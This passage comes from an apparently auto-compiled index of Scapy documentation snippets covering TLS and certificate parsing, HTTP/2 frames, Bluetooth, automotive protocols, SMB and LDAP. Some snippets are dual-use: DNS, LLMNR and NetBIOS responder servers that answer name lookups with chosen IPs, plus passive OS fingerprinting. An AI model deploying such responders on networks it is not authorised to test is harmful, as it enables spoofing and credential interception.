import *\n```\n\n----------------------------------------\n\nTITLE: RSA Private Key Parsing\nDESCRIPTION: Creates and displays an RSA private key object from binary data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nprivkey = RSAPrivateKey(keystr)\nprivkey.show()\n```\n\n----------------------------------------\n\nTITLE: Creating HTTP/2 Settings Acknowledgment Frame with Scapy in Python\nDESCRIPTION: Constructs an HTTP/2 frame to acknowledge the server's settings using Scapy's HTTP/2 implementation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nset_ack = h2.H2Frame(flags={'A'})/h2.H2SettingsFrame()\nset_ack.show()\n```\n\n----------------------------------------\n\nTITLE: RSA Key Version Extraction\nDESCRIPTION: Extracts and displays the version field from an RSA private key in both hex and raw formats.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nv = privkey.version\nprint('The \\'version\\' stripped from any ASN.1 encoding is 0x%02x.' % v.val)\nprint('The \\'version\\' field corresponds to bytes  %r.' % raw(v))\n```\n\n----------------------------------------\n\nTITLE: Basic SMB Client Usage with Authentication\nDESCRIPTION: Demonstrates how to create an SMB client connection with administrator credentials using interactive authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> smbclient(\"server1.domain.local\", \"Administrator@domain.local\")\nPassword: ************\nSMB authentication successful using SPNEGOSSP[KerberosSSP] !\n```\n\n----------------------------------------\n\nTITLE: Parsing Client Key Exchange and Final Messages\nDESCRIPTION: Parses the ClientKeyExchange, ChangeCipherSpec, and Finished messages\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nrecord5_str = open('raw_data/tls_session_protected/05_cli.raw', 'rb').read()\nrecord5 = TLS(record5_str)\nrecord5.show()\n```\n\nLANGUAGE: python\nCODE:\n```\nrecord5 = TLS(record5_str, tls_session=record2.tls_session.mirror())\nrecord5.show()\n```\n\n----------------------------------------\n\nTITLE: Basic LDAP Client Usage in Python with Scapy\nDESCRIPTION: Demonstrates the simplest unauthenticated usage of the LDAP_Client class, including connecting, binding, and performing a search request.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/ldap.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> client = LDAP_Client()\n>>> client.connect(\"192.168.0.100\")\n>>> client.bind(LDAP_BIND_MECHS.NONE)\n>>> client.sr1(LDAP_SearchRequest()).show()\n┃ Connecting to 192.168.0.100 on port 389...\n└ Connected from ('192.168.0.102', 40228)\nNONE bind succeeded !\n>> LDAP_SearchRequest\n<< LDAP_SearchResponseEntry\n###[ LDAP ]###\nmessageID = 0x1 <ASN1_INTEGER[1]>\n\\protocolOp\\\n|###[ LDAP_SearchResponseEntry ]###\n|  objectName= <ASN1_STRING[b'']>\n|  \\attributes\\\n|   |###[ LDAP_PartialAttribute ]###\n|   |  type      = <ASN1_STRING[b'domainFunctionality']>\n|   |  \\values    \\\n|   |   |###[ LDAP_AttributeValue ]###\n|   |   |  value     = <ASN1_STRING[b'7']>\n|   |###[ LDAP_PartialAttribute ]###\n|   |  type      = <ASN1_STRING[b'forestFunctionality']>\n|   |  \\values    \\\n|   |   |###[ LDAP_AttributeValue ]###\n|   |   |  value     = <ASN1_STRING[b'7']>\n|   |###[ LDAP_PartialAttribute ]###\n|   |  type      = <ASN1_STRING[b'domainControllerFunctionality']>\n|   |  \\values    \\\n|   |   |###[ LDAP_AttributeValue ]###\n|   |   |  value     = <ASN1_STRING[b'7']>\n[...]\n```\n\n----------------------------------------\n\nTITLE: Interactive Shell Example - ICMP Echo Request with Scapy\nDESCRIPTION: Demonstrates using Scapy's interactive shell to send an ICMP Echo Request to github.com and display the reply source IP address. Shows basic packet creation and sending functionality.\nSOURCE: https://github.com/secdev/scapy/blob/master/README.md#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nsudo ./run_scapy\nWelcome to Scapy\n>>> p = IP(dst=\"github.com\")/ICMP()\n>>> r = sr1(p)\nBegin emission:\n.Finished to send 1 packets.\n*\nReceived 2 packets, got 1 answers, remaining 0 packets\n>>> r[IP].src\n'192.30.253.113'\n```\n\n----------------------------------------\n\nTITLE: Network Server Implementations\nDESCRIPTION: Implementations of various network servers including DNS, mDNS, LLMNR and Netbios.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_47\n\nLANGUAGE: python\nCODE:\n```\ndnsd(iface=\"tap0\", match={\"google.com\": \"1.1.1.1\"}, joker=\"192.168.1.1\")\n\nmdnsd(iface=\"eth0\", joker=\"192.168.1.1\")\n\nconf.iface = \"tap0\"\nllmnrd(iface=\"tap0\", from_ip=Net(\"10.0.0.1/24\"))\n\nnbnsd(iface=\"eth0\")\nnbnsd(iface=\"eth0\", ip=\"192.168.122.17\")\n```\n\n----------------------------------------\n\nTITLE: Creating and Adding DNT Header in HTTP/2 with Scapy\nDESCRIPTION: This snippet creates a Do Not Track (DNT) header field and adds it to an existing HTTP/2 headers frame. It uses Scapy's HTTP/2 module to create the header strings and add them to the frame payload.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\ndnt_name_str = h2.HPackLiteralString('dnt')\ndnt_val_str = h2.HPackLiteralString('1')\ndnt_name = h2.HPackHdrString(data = dnt_name_str)\ndnt_value = h2.HPackHdrString(data = dnt_val_str)\ndnt_hdr = h2.HPackLitHdrFldWithIncrIndexing(\n    hdr_name = dnt_name,\n    hdr_value = dnt_value\n)\ndnt_hdr.show()\nhdrs_frm.payload.hdrs.append(dnt_hdr)\n```\n\n----------------------------------------\n\nTITLE: Installing ReadTheDocs Theme for Sphinx Documentation\nDESCRIPTION: This command installs the ReadTheDocs theme for Sphinx, which can be used to style the Scapy documentation to match the official online version.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\npip install sphinx_rtd_theme\n```\n\n----------------------------------------\n\nTITLE: Configuring XCP Contrib Settings in Python\nDESCRIPTION: Demonstrates how to configure XCP contrib settings for address granularity, max CTO/DTO size, and byte order handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_16\n\nLANGUAGE: Python\nCODE:\n```\nconf.contribs['XCP']['Address_Granularity_Byte'] = 1  # Can be 1, 2 or 4\nconf.contribs['XCP']['MAX_CTO'] = 8\nconf.contribs['XCP']['MAX_DTO'] = 8\n\nconf.contribs['XCP']['allow_byte_order_change'] = False\nconf.contribs['XCP']['allow_ag_change'] = False\nconf.contribs['XCP']['allow_cto_and_dto_change'] = False\n```\n\n----------------------------------------\n\nTITLE: Passive OS Fingerprinting with Scapy and p0f\nDESCRIPTION: Demonstrates using Scapy with the p0f module to perform passive OS fingerprinting on captured packets. The example loads the p0f module and applies it to sniffed packets to guess the operating system.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nload_module(\"p0f\")\np0f(p)\na=sniff(prn=prnp0f)\n```\n\n----------------------------------------\n\nTITLE: DateTime Print Example\nDESCRIPTION: Demonstrates printing current datetime and using Alt+Enter for cell execution.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n# You may also use Alt+Enter to run the current cell, then create a new cell right below\nfrom datetime import datetime\nprint('This is the time right now: %s' % datetime.now())\n```\n\n----------------------------------------\n\nTITLE: Starting and Stopping BLE Advertising with Scapy\nDESCRIPTION: These code snippets show how to start and stop BLE advertising using Scapy. They create and send HCI commands to enable or disable advertising on the BLE controller.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n# Starting advertising\nbt.sr(HCI_Hdr()/\n      HCI_Command_Hdr()/\n      HCI_Cmd_LE_Set_Advertise_Enable(enable=True))\n\n# Stopping advertising\nbt.sr(HCI_Hdr()/\n      HCI_Command_Hdr()/\n      HCI_Cmd_LE_Set_Advertise_Enable(enable=False))\n```\n\n----------------------------------------\n\nTITLE: Reading RSA Private Key File\nDESCRIPTION: Reads binary RSA private key data from a DER-encoded file.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nkeystr = open('raw_data/pki/ca_key.der', 'rb').read()\nprint(repr(keystr))\n```\n\n----------------------------------------\n\nTITLE: Sending Control Packet over Bluetooth HCI\nDESCRIPTION: Demonstrates sending a no-operation control packet through HCI to test communication with the Bluetooth device. Returns the response packet with status information.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> ans, unans = bt.sr(HCI_Hdr()/HCI_Command_Hdr())\n>>> # ans[0] = Answered packet #0\n>>> # ans[0][1] = The response packet\n>>> p = ans[0][1]\n>>> p.show()\n```\n\n----------------------------------------\n\nTITLE: SMB Server with NTLM Authentication in Read-Write Mode\nDESCRIPTION: Configures an SMB server with NTLM authentication and enables read-write access by setting readonly to False. Includes user credentials for authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nsmbserver(\n    shares=[SMBShare(name=\"Scapy\", path=\"/tmp\")],\n    iface=\"eth0\",\n    ssp=NTLMSSP(\n        IDENTITIES={\n            \"User1\": MD4le(\"Password1\"),\n            \"Administrator\": MD4le(\"Password2\"),\n        },\n    ),\n    # Enable Read-Write\n    readonly=False,\n)\n```\n\n----------------------------------------\n\nTITLE: Testing ECU Automaton Power Cycling in Python\nDESCRIPTION: Example code that tests the ECU automaton's power cycling capabilities. Initializes the power supply and automaton, then demonstrates turning the ECU on and off while monitoring current consumption.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\nimport threading\nimport time\nfrom scapy.contrib.cansocket import NativeCANSocket\nfrom scapy.error import log_runtime\n\nps = AutomatonPowerSupply()\ncs = NativeCANSocket(\"vcan0\")\nautomaton = EcuAutomaton(debug=1, power_supply=ps, sock=cs)\nautomaton.runbg()\n\nps.on()\ntime.sleep(0.1)\nprint(f\"Current consumption {ps.current_on.value}\")\nps.off()\ntime.sleep(0.1)\nprint(f\"Current consumption {ps.current_on.value}\")\n\nautomaton.stop()\n```\n\n----------------------------------------\n\nTITLE: Adding Compression Header from Static Table in HTTP/2\nDESCRIPTION: Retrieves the index of the 'accept-encoding' header with value 'gzip, deflate' from the static table. Creates an indexed header reference and adds it to the headers frame payload.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_37\n\nLANGUAGE: python\nCODE:\n```\nz_hdr_idx = tblhdr.get_idx_by_name_and_value('accept-encoding', 'gzip, deflate')\nz_hdr = h2.HPackIndexedHdr(index = z_hdr_idx)\nz_hdr.show()\nhdrs_frm.payload.hdrs.append(z_hdr)\n```\n\n----------------------------------------\n\nTITLE: Base64 Encoded PNG Image Data\nDESCRIPTION: A base64 encoded string representing PNG image binary data. The string appears to be a fragment of a larger encoded image.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/graphs-ipids.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: base64\nCODE:\n```\n\"png\": \"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\n\n\n```\n\n----------------------------------------\n\nTITLE: Defining Example Packets with Variable Length Fields in Scapy\nDESCRIPTION: Examples of packet definitions using variable length fields in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nclass TestSLF(Packet):\n    fields_desc=[ FieldLenField(\"len\", None, length_of=\"data\"),\n                  StrLenField(\"data\", \"\", length_from=lambda pkt:pkt.len) ]\n\nclass TestPLF(Packet):\n    fields_desc=[ FieldLenField(\"len\", None, count_of=\"plist\"),\n                  PacketListField(\"plist\", None, IP, count_from=lambda pkt:pkt.len) ]\n\nclass TestFLF(Packet):\n    fields_desc=[ \n       FieldLenField(\"the_lenfield\", None, count_of=\"the_varfield\"), \n       FieldListField(\"the_varfield\", [\"1.2.3.4\"], IPField(\"\", \"0.0.0.0\"), \n                       count_from = lambda pkt: pkt.the_lenfield) ]\n\nclass TestPkt(Packet):\n    fields_desc = [ ByteField(\"f1\",65),\n                    ShortField(\"f2\",0x4244) ]\n    def extract_padding(self, p):\n        return \"\", p\n\nclass TestPLF2(Packet):\n    fields_desc = [ FieldLenField(\"len1\", None, count_of=\"plist\",fmt=\"H\", adjust=lambda pkt,x:x+2),\n                    FieldLenField(\"len2\", None, length_of=\"plist\",fmt=\"I\", adjust=lambda pkt,x:(x+1)/2),\n                    PacketListField(\"plist\", None, TestPkt, length_from=lambda x:(x.len2*2)/3*3) ]\n```\n\n----------------------------------------\n\nTITLE: Exporting and Importing Hexdump Format in Scapy\nDESCRIPTION: Demonstrates how to display packet data in hexdump format using hexdump() and import it back using import_hexcap(). The hexdump format provides a readable view of packet bytes alongside their ASCII representation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_28\n\nLANGUAGE: Python\nCODE:\n```\n>>> hexdump(pkt)\n0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.\n0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......\n>>> pkt_hex = Ether(import_hexcap())\n```\n\n----------------------------------------\n\nTITLE: Creating a Cookie Header with Privacy Protection in HTTP/2\nDESCRIPTION: Builds a cookie header that prevents indexing of sensitive data. Uses the static table for the 'cookie' name, but creates a compressed string for the value with the never_index bit set to prevent any intermediaries from storing the cookie value.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\ncookie_hdr_idx = tblhdr.get_idx_by_name('cookie')\ncookie_str = h2.HPackHdrString(data = h2.HPackZString(cookie[0]))\ncookie_hdr = h2.HPackLitHdrFldWithoutIndexing(\n    never_index = 1,\n    index = cookie_hdr_idx,\n    hdr_value = cookie_str\n)\ncookie_hdr.show()\nhdrs_frm.payload.hdrs.append(cookie_hdr)\n```\n\n----------------------------------------\n\nTITLE: Certificate Field Inspection\nDESCRIPTION: Displays specific fields from the X.509 certificate structure.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\ncert.tbsCertificate.subjectPublicKeyInfo.subjectPublicKey.show()\ncert.tbsCertificate.subject[-1].rdn[0].show()\n```\n\n----------------------------------------\n\nTITLE: Instantiating Basic PROFINET Packets in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to create basic PROFINET packets using Scapy. It shows the instantiation of ProfinetIO, PROFIsafe, and PNIORealTime_IOxS packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/pnio.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n>>> load_contrib('pnio')\n>>> raw(ProfinetIO()/b'AAA')\nb'\\x00\\x00AAA'\n>>> raw(PROFIsafe.build_PROFIsafe_class(PROFIsafeControl, 4)(data = b'AAA', control=0x20, crc=0x424242))\nb'AAA\\x00 BBB'\n>>> hexdump(PNIORealTime_IOxS())\n0000   80                                                 .\n```\n\n----------------------------------------\n\nTITLE: SMB Server Implementation\nDESCRIPTION: Basic setup for an SMB server with NTLM authentication and share configuration.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_4\n\nLANGUAGE: 